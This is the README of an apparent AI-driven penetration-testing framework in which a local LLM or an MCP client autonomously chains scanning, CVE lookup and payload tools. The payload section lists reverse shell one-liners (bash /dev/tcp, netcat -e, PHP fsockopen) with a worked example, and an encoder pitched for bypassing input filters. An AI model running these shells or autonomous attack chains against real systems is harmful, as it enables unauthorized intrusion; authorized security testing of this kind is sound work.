<div align="center">

# 🔴 RedTeam MCP — AI-Powered Red Team Automation

### *Autonomous penetration testing powered by a local LLM*

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=flat-square&logo=linux&logoColor=white)](https://kali.org)
[![Ollama](https://img.shields.io/badge/LLM-Ollama%20%7C%20llama3.1%3A8b-green?style=flat-square)](https://ollama.com)
[![MCP](https://img.shields.io/badge/Protocol-MCP%20%7C%20FastMCP-red?style=flat-square)](https://modelcontextprotocol.io)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active%20Development-orange?style=flat-square)]()

<br/>

> ⚠️ **This tool is for authorized penetration testing only.**
> Always obtain explicit written permission before testing any target.
> Unauthorized use is illegal under CFAA, CMA, and equivalent laws worldwide.

</div>

---

## 📖 What Is This?

**RedTeam MCP** is a full-stack, AI-driven penetration testing framework that replaces manual tool chaining with an autonomous local LLM operator. Instead of running `nmap`, then reading output, then deciding to run `nikto`, then reading that, then looking up CVEs — you describe your goal in plain English and the AI does it all.

The framework is built on two layers:

- **`ai_controller.py`** — A standalone Ollama-powered controller. Your local `llama3.1:8b` model reads tool output, decides what to run next, logs findings, and generates reports — all without an internet connection or paid API.
- **`orchestrator.py`** — A full [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server that exposes the same capabilities to Claude Desktop or any MCP-compatible AI client.

Both layers sit on top of four modular tool libraries covering every phase of a real-world pentest engagement: **recon → vuln scanning → exploit research → reporting**.

---

## 🧠 Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         OPERATOR INPUT                          │
│           (plain English goal or interactive command)           │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    OLLAMA LLM ENGINE                            │
│                  model: llama3.1:8b                             │
│                                                                 │
│  • Reads system prompt with decision logic + few-shot examples  │
│  • Outputs a single structured JSON action                      │
│  • Receives summarized tool output as context                   │
│  • Decides next action until goal is complete                   │
└─────────────────────────┬───────────────────────────────────────┘
                          │  JSON action e.g.
                          │  {"action": "nmap_scan",
                          │   "target": "192.168.1.10",
                          │   "ports": "1-1000"}
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                     TOOL DISPATCHER                             │
│                                                                 │
│   Routes action → correct tool handler → executes → captures   │
│                                                                 │
│   nmap_scan ──────────► subprocess nmap                        │
│   nikto_scan ─────────► subprocess nikto                       │
│   searchsploit ───────► subprocess searchsploit --json         │
│   http_headers ───────► httpx GET + header analysis            │
│   analyze_service ────► internal CVE knowledge base            │
│   reverse_shell ──────► payload generator                      │
│   log_finding ────────► in-memory finding store                │
│   generate_report ────► Markdown / JSON report writer          │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│                   RESULT SUMMARIZER                             │
│                                                                 │
│  Raw output is pre-digested before feeding back to the LLM.    │
│  "3000 bytes of nmap XML" becomes:                             │
│  "Nmap found 3 ports: 21/tcp vsftpd 2.3.4, 80/tcp Apache..."  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
                   Loop continues
              until action = "done"
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│              FINDINGS LOG + PENTEST REPORT                      │
│   All findings auto-logged → professional Markdown report       │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🗂️ Project Structure

```
redteam-mcp/
│
├── ai_controller.py        # Main entry point — Ollama AI controller
│                           # Runs standalone, no MCP client needed
│
├── orchestrator.py         # MCP server with high-level workflow tools
│                           # Connect to Claude Desktop or any MCP client
│
├── server.py               # Lightweight MCP server (individual tools only)
│                           # Use this if you don't need workflow automation
│
├── tools/
│   ├── __init__.py
│   ├── recon.py            # Recon & enumeration (nmap, dns, subdomains, whois)
│   ├── vuln_scan.py        # Vulnerability scanning (nikto, headers, CVE analysis)
│   ├── exploit.py          # Exploit research & payload generation
│   └── reporting.py        # Finding logging & report generation
│
├── utils/
│   └── helpers.py          # Shared utilities
│
├── reports/                # Generated pentest reports output here
│                           # (gitignored — never commit client data)
│
├── requirements.txt
├── .gitignore
└── README.md
```

---

## ⚙️ Requirements

### Operating System

> Tested on **Kali Linux 2024.x**. Also works on Ubuntu 22.04+, Parrot OS, and macOS (system tools may need Homebrew).

### Python

```
Python 3.10 or higher
```

### Ollama + Model

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull the default model (4.7GB)
ollama pull llama3.1:8b

# Verify it's working
ollama run llama3.1:8b "respond with: {\"action\": \"done\", \"message\": \"ok\"}"
```

### System Security Tools

These are called as subprocesses. Install what you need:

```bash
# Kali Linux (most are pre-installed)
sudo apt update
sudo apt install -y nmap nikto whois exploitdb

# Metasploit (optional — for msf_search)
# Usually pre-installed on Kali. If not:
sudo apt install -y metasploit-framework
```

| Tool | Required | Used For |
|------|----------|----------|
| `nmap` | ✅ Recommended | Port scanning, service detection, vuln scripts |
| `nikto` | ✅ Recommended | Web server vulnerability scanning |
| `whois` | ✅ Recommended | Domain/IP registration lookup |
| `searchsploit` / `exploitdb` | ✅ Recommended | ExploitDB search |
| `dig` | ✅ Usually pre-installed | DNS record enumeration |
| `msfconsole` | ⚡ Optional | Metasploit module search |
| `rlwrap` | ⚡ Optional | Better reverse shell listener experience |

---

## 🚀 Installation

### Step 1 — Clone the Repository

```bash
git clone https://github.com/YOURNAME/redteam-mcp.git
cd redteam-mcp
```

### Step 2 — Create a Virtual Environment

```bash
python3 -m venv redteam-env
source redteam-env/bin/activate
```

### Step 3 — Install Python Dependencies

```bash
pip install -r requirements.txt
```

**`requirements.txt`:**
```
mcp>=1.2.0
httpx>=0.27.0
requests>=2.31.0
```

### Step 4 — Start Ollama

```bash
# Start the Ollama service (if not already running)
ollama serve

# Verify the model is available
ollama list
```

### Step 5 — Verify Everything Works

```bash
# Should print the banner and connect to Ollama
python ai_controller.py --help
```

---

## 🎮 Usage

There are three ways to use this framework depending on your workflow.

---

### ▶️ Mode 1 — AI Controller (Standalone, Recommended)

`ai_controller.py` is the primary way to use this tool. No MCP client needed. The Ollama LLM acts as the operator and automatically chains tools to complete your goal.

#### Interactive Mode

You give natural language instructions one step at a time. The AI decides which tool to run, executes it, and shows you the output.

```bash
python ai_controller.py
```

```
 ██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
 ...
        AI-Powered Red Team Controller — Ollama Edition

[12:34:01] [+] Ollama connected — model: llama3.1:8b

redteam> scan 192.168.1.10 for open ports
[12:34:03] [AI] Decided: nmap_scan
[12:34:03] [*] nmap -sV -p 1-1000 --open 192.168.1.10
─────────────────────────────────────────
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.49
─────────────────────────────────────────
[LLM context summary: Nmap found 2 ports: 21/tcp vsftpd 2.3.4, 80/tcp Apache 2.4.49]

redteam> analyze what you found
[12:34:15] [AI] Decided: analyze_service
[12:34:15] [FINDING — CRITICAL] vsftpd 2.3.4 Backdoor RCE

redteam> findings
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FINDINGS SUMMARY — 2 total
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [Critical      ] FIND-001 — vsftpd 2.3.4 Backdoor RCE
  [Critical      ] FIND-002 — Apache 2.4.49 Path Traversal/RCE

redteam> report "Acme Corp" "J.Smith" "192.168.1.10"
redteam> exit
```

**Interactive mode built-in commands:**

| Command | Description |
|---------|-------------|
| `findings` | Display all findings logged this session |
| `history` | Show the last 20 tool calls made |
| `report <client> <tester> <scope>` | Generate and save the pentest report |
| `exit` / `quit` | End the session |

---

#### Autonomous Mode

You give a goal. The AI plans and executes the entire engagement chain by itself, step by step, until it decides it's done or hits `--max-steps`.

```bash
# Basic autonomous scan
python ai_controller.py --auto "run full recon on 192.168.1.10"

# Full web application test
python ai_controller.py --auto "perform a complete web application pentest on http://10.0.0.5"

# Extended autonomous engagement (more steps = deeper coverage)
python ai_controller.py --auto "identify all vulnerabilities on 10.0.0.10 and generate a report" --max-steps 25

# Use a different model
python ai_controller.py --model llama3.1:70b --auto "triage the host at 192.168.1.50"
```

**What a typical autonomous run looks like:**
```
Step 1/15 — Action: nmap_scan          (discovers open ports)
Step 2/15 — Action: analyze_service    (matches vsftpd 2.3.4 → CVE-2011-2523)
Step 3/15 — Action: searchsploit       (finds Metasploit module)
Step 4/15 — Action: log_finding        (Critical — vsftpd Backdoor RCE logged)
Step 5/15 — Action: http_headers       (checks web server security headers)
Step 6/15 — Action: nikto_scan         (web vulnerability scan)
Step 7/15 — Action: log_finding        (High — missing CSP/HSTS headers logged)
Step 8/15 — Action: done               (AI summarizes and exits)
```

**CLI Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--model MODEL` | `llama3.1:8b` | Ollama model to use |
| `--auto "GOAL"` | — | Enable autonomous mode with this goal |
| `--max-steps N` | `15` | Maximum autonomous steps before stopping |

---

### ▶️ Mode 2 — MCP Server (Claude Desktop Integration)

`orchestrator.py` runs as a full MCP server. Connect it to Claude Desktop (or any MCP client) and control your entire engagement through a natural language conversation.

```bash
# Start the MCP orchestrator server
python orchestrator.py

# Test with MCP Inspector (browser UI)
mcp dev orchestrator.py
```

**Connect to Claude Desktop** — edit your config file:

- **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
- **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
- **Linux:** `~/.config/Claude/claude_desktop_config.json`

```json
{
  "mcpServers": {
    "redteam": {
      "command": "/path/to/redteam-env/bin/python",
      "args": ["/path/to/redteam-mcp/orchestrator.py"]
    }
  }
}
```

Restart Claude Desktop. You'll see the 🔌 tools icon appear. Then just talk:

> *"Run a full recon on 192.168.1.10, check the web server for vulnerabilities, log any critical findings, and generate a pentest report for client Acme Corp"*

Claude will automatically call `full_recon_workflow`, then `web_app_assessment`, then `log_finding` multiple times, then `generate_engagement_report` — all from that one sentence.

---

### ▶️ Mode 3 — Python API (Scripting / Integration)

Import and use individual tools or workflow functions directly in your own Python scripts:

```python
from mcp.server.fastmcp import FastMCP
from tools.recon import register_recon_tools
from tools.vuln_scan import register_vuln_tools
from tools.exploit import register_exploit_tools
from tools.reporting import register_reporting_tools

# Build a custom MCP server with only the tools you need
mcp = FastMCP("my-custom-server")
register_recon_tools(mcp)
register_vuln_tools(mcp)
register_exploit_tools(mcp)
register_reporting_tools(mcp)

mcp.run(transport="stdio")
```

---

## 🧰 Complete Tool Reference

### 🔍 Recon & Enumeration — `tools/recon.py`

> Passive and active information gathering. Always run this first.

| Tool | Parameters | Description |
|------|-----------|-------------|
| `nmap_scan` | `target`, `ports="1-1000"`, `scan_type="SV"`, `extra_args=""` | Port scan with service/version detection. Returns raw nmap output including open ports, services, and versions. |
| `dns_recon` | `target` | Enumerates A, MX, NS, TXT, AAAA, CNAME records for a domain using `dig`. |
| `whois_lookup` | `target` | WHOIS registration data for a domain or IP. Reveals registrar, owner, creation dates, nameservers. |
| `subdomain_enum` | `target`, `wordlist=None` | DNS bruteforce using a built-in 35-entry wordlist or a custom wordlist file. Returns resolved subdomains with IPs. |
| `banner_grab` | `host`, `port`, `timeout=5` | Connects to a port and reads the raw service banner. Useful for fingerprinting services nmap missed. |

**Example — nmap scan:**
```json
{
  "action": "nmap_scan",
  "target": "192.168.1.10",
  "ports": "1-1000",
  "flags": "-sV"
}
```

---

### 🛡️ Vulnerability Scanning — `tools/vuln_scan.py`

> Identify weaknesses in discovered services and web applications.

| Tool | Parameters | Description |
|------|-----------|-------------|
| `nikto_scan` | `target`, `port=80`, `ssl=False`, `extra_args=""` | Runs Nikto web vulnerability scanner. Identifies outdated software, misconfigurations, dangerous files, and CVEs. |
| `check_http_headers` | `url` | Analyzes HTTP response headers for missing security controls: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. Also reveals Server and X-Powered-By version info. |
| `analyze_service_version` | `service`, `version` | Matches a service name + version against an internal CVE knowledge base. Covers Apache, OpenSSH, vsftpd, Samba, Log4j, IIS, OpenSSL, Struts, Drupal, and more. |
| `run_nmap_vuln_scripts` | `target`, `ports="80,443,22,21,25"` | Runs `nmap --script vuln` against specified ports. Uses nmap's built-in vulnerability detection scripts. |

**Example — HTTP header check:**
```json
{
  "action": "http_headers",
  "url": "http://192.168.1.10"
}
```

**CVE database covers (partial list):**
```
Apache 2.4.49   → CVE-2021-41773 (Path Traversal / RCE)
vsftpd 2.3.4    → CVE-2011-2523  (Backdoor RCE)
Samba 3.5.0     → CVE-2017-7494  (SambaCry EternalRed)
Log4j 2.14.x    → CVE-2021-44228 (Log4Shell)
OpenSSL 1.0.1   → CVE-2014-0160  (Heartbleed)
Struts 2.5.x    → CVE-2017-5638  (Equifax RCE)
Drupal 7.x      → CVE-2018-7600  (Drupalgeddon2)
IIS 6.0         → CVE-2017-7269  (Buffer Overflow RCE)
```

---

### 💥 Exploit Research & Payload Generation — `tools/exploit.py`

> Research known exploits and generate attack payloads for authorized testing.

| Tool | Parameters | Description |
|------|-----------|-------------|
| `searchsploit` | `query`, `exact_match=False` | Searches ExploitDB via `searchsploit --json`. Returns exploit titles, paths, and types (remote, local, webapps). |
| `generate_reverse_shell` | `lhost`, `lport`, `shell_type="bash"` | Generates ready-to-use reverse shell one-liners. Also outputs base64-encoded version and listener command. |
| `encode_payload` | `payload`, `encoding="base64"` | Encodes payloads to help bypass input filters. Supports base64, URL encoding, hex, and unicode. |
| `msf_search` | `query` | Searches Metasploit Framework modules matching a query. Falls back to online URL if msfconsole not installed. |

**Supported reverse shell types:**

| Type | Command Generated |
|------|-------------------|
| `bash` | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| `python3` | Python socket reverse shell |
| `php` | `php -r '$sock=fsockopen(...)'` |
| `perl` | Perl socket reverse shell |
| `ruby` | Ruby TCPSocket reverse shell |
| `nc` | `nc -e /bin/sh LHOST LPORT` |
| `nc_mkfifo` | Netcat with mkfifo (no `-e` required) |
| `powershell` | PowerShell TCP client reverse shell |

**Example — generate bash reverse shell:**
```json
{
  "action": "reverse_shell",
  "lhost": "10.0.0.1",
  "lport": 4444,
  "type": "bash"
}
```

Output includes:
```json
{
  "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
  "base64": "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=",
  "listener": "nc -lvnp 4444",
  "rlwrap_listener": "rlwrap nc -lvnp 4444"
}
```

---

### 📝 Reporting & Documentation — `tools/reporting.py`

> Log findings and generate professional client-ready reports.

| Tool | Parameters | Description |
|------|-----------|-------------|
| `set_engagement_scope` | `client_name`, `scope`, `start_date`, `tester_name`, `engagement_type` | Sets engagement metadata used in the final report header. |
| `log_finding` | `title`, `severity`, `target`, `description`, `evidence`, `recommendation`, `cvss_score`, `cve` | Logs a single finding. Severity: `Critical` / `High` / `Medium` / `Low` / `Informational`. |
| `list_findings` | — | Returns all findings logged this session, grouped by severity with counts. |
| `generate_report` | `format="markdown"` | Compiles all logged findings into a professional pentest report. Output: Markdown or JSON. |

**Severity classification guide:**

| Severity | CVSS Range | Example |
|----------|-----------|---------|
| Critical | 9.0 – 10.0 | Unauthenticated RCE, CVE-exploitable backdoor |
| High | 7.0 – 8.9 | SQLi, authenticated RCE, privilege escalation |
| Medium | 4.0 – 6.9 | XSS, CSRF, weak credentials, outdated software |
| Low | 0.1 – 3.9 | Missing headers, version disclosure, info leaks |
| Informational | N/A | Open ports, tech stack enumeration, configuration notes |

---

### 🔗 Orchestration Workflows — `orchestrator.py`

> High-level workflows that chain multiple tools automatically. Use these for full engagement phases.

| Workflow | Stages | Output |
|----------|--------|--------|
| `full_recon_workflow(target)` | WHOIS → DNS recon → subdomain enum → nmap -sV → banner grab on web ports | Asset inventory: IPs, subdomains, open ports, services + recommendations |
| `web_app_assessment(url)` | HTTP headers → Nikto → optional dir enum → auto-log key findings | Risk score, technology fingerprint, all findings auto-logged |
| `network_assessment(target)` | nmap -sV -sC → nmap vuln scripts → CVE matching → searchsploit research | Attack surface rating, CVE matches, exploit availability |
| `quick_triage(target)` | nmap top-20-ports → CVE quick check → HTTP probe | Risk level (CRITICAL/HIGH/MEDIUM/LOW), priority action list — done in ~60s |
| `generate_engagement_report(...)` | Pulls all `log_finding()` entries → builds structured report | Professional Markdown report saved to `reports/` |

---

## 🤖 Choosing an Ollama Model

The AI controller works with any model available in Ollama. Here's how the main ones compare for this use case:

| Model | Size | Speed | JSON Accuracy | Best Used For |
|-------|------|-------|---------------|---------------|
| `llama3.1:8b` ⭐ | 4.7GB | Fast | High | Default — best all-round choice |
| `llama3.1:70b` | 40GB | Slow | Very High | Complex multi-step autonomous engagements |
| `mistral:7b` | 4.1GB | Very Fast | High | Quick triage, simple scans |
| `codellama:13b` | 7.4GB | Medium | Medium | Payload generation, code-heavy tasks |
| `deepseek-r1:8b` | 4.9GB | Medium | High | Chain-of-thought — good for complex decisions |
| `qwen2.5:7b` | 4.4GB | Fast | High | Strong instruction following |

```bash
# Pull any model
ollama pull llama3.1:70b
ollama pull mistral:7b

# Use it
python ai_controller.py --model mistral:7b
```

> **Tip:** If the model outputs text before the JSON (a common issue with smaller models), the built-in `query_with_retry()` automatically sends a correction prompt and retries up to 3 times before falling back.

---

## 🔄 Full Engagement Walkthrough

Here's a complete example of how an authorized engagement flows using `ai_controller.py` in interactive mode:

```bash
python ai_controller.py
```

```
# Step 1 — Quick triage to understand the attack surface
redteam> triage the host at 192.168.1.10
→ AI runs: quick_triage
→ Output: 3 open ports found — 21 (vsftpd), 80 (Apache), 445 (SMB) | Risk: CRITICAL

# Step 2 — Deeper recon
redteam> run full reconnaissance on 192.168.1.10
→ AI runs: nmap_scan, dns_recon, banner_grab
→ Output: service versions captured, subdomains resolved

# Step 3 — Web application assessment
redteam> check the web server for vulnerabilities
→ AI runs: http_headers → nikto_scan
→ Output: Missing HSTS/CSP headers, nikto finds /phpmyadmin exposed

# Step 4 — CVE research on discovered services
redteam> analyze the vsftpd and apache services you found
→ AI runs: analyze_service (vsftpd 2.3.4) → CVE-2011-2523 CRITICAL
→ AI runs: analyze_service (Apache 2.4.49) → CVE-2021-41773 CRITICAL
→ AI runs: searchsploit vsftpd 2.3.4 → Metasploit module found
→ AI runs: searchsploit apache 2.4.49 → PoC exploit found

# Step 5 — Log findings
redteam> log all the critical findings you've identified
→ AI runs: log_finding × 4

# Step 6 — Generate report
redteam> report "Acme Corp" "Jane Smith" "192.168.1.10 (authorized)"

# Done
redteam> exit
```

**Generated report saved to:** `reports/Acme_Corp_pentest_report_20250301_143022.md`

---

## 🛠️ Prompting the AI Effectively

The controller uses structured prompts with decision logic and few-shot examples to guide `llama3.1:8b`. For best results when using interactive mode:

**✅ Good prompts:**
```
scan 192.168.1.10 for open ports            # specific action
analyze the vsftpd 2.3.4 service you found  # references previous context
search exploitdb for apache 2.4.49          # specific tool + target
log a critical finding for the vsftpd CVE   # clear intent
```

**❌ Weaker prompts:**
```
do something                    # too vague
hack the target                 # no specific action
what should I do?               # AI may ask_user instead of acting
```

**The AI automatically chains actions.** If you say *"analyze everything"*, it will run `analyze_service` on every service found in the previous scan. You don't need to specify each tool call — just express intent.

---

## ⚠️ Legal Disclaimer

This framework is designed **exclusively for:**
- Authorized penetration tests with signed scope of work
- CTF (Capture the Flag) competitions
- Personal lab environments (VMs, HackTheBox, TryHackMe, etc.)
- Security research on systems you own

**It is illegal to use this tool against systems you do not own or do not have explicit written authorization to test.** This includes unauthorized scanning, enumeration, or exploitation. Violations may result in criminal prosecution under:

- 🇺🇸 Computer Fraud and Abuse Act (CFAA)
- 🇬🇧 Computer Misuse Act (CMA)
- 🇪🇺 EU Directive on Attacks Against Information Systems
- Equivalent laws in your jurisdiction

The authors and contributors accept **zero liability** for misuse. Use responsibly.

---

## 🗺️ Roadmap

- [ ] Web fuzzing integration (ffuf / gobuster wrapper)
- [ ] Active Directory recon module (BloodHound, ldapdomaindump, CrackMapExec)
- [ ] Credential spraying module (SSH, SMB, HTTP form login)
- [ ] Screenshot capture for web targets (Selenium / Playwright)
- [ ] Multi-target batch mode (`--target-list targets.txt`)
- [ ] OWASP Top 10 automated test suite
- [ ] Live CVE feed integration (NVD API)
- [ ] Docker container for portable deployment
- [ ] Web dashboard for findings review

---

## 🤝 Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you'd like to change.

```bash
# Fork the repo, create a feature branch
git checkout -b feat/your-feature-name

# Make your changes, then commit with a clear message
git commit -m "feat: add ffuf web fuzzing wrapper"

# Push and open a Pull Request
git push origin feat/your-feature-name
```

**Commit message format:**
```
feat:     new feature or tool
fix:      bug fix
refactor: code restructure (no behavior change)
docs:     documentation update
chore:    dependency update, cleanup
```

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for full details.

---

<div align="center">

**Built for the security community** 🔐

*Test ethically. Test legally. Test with permission.*

</div>
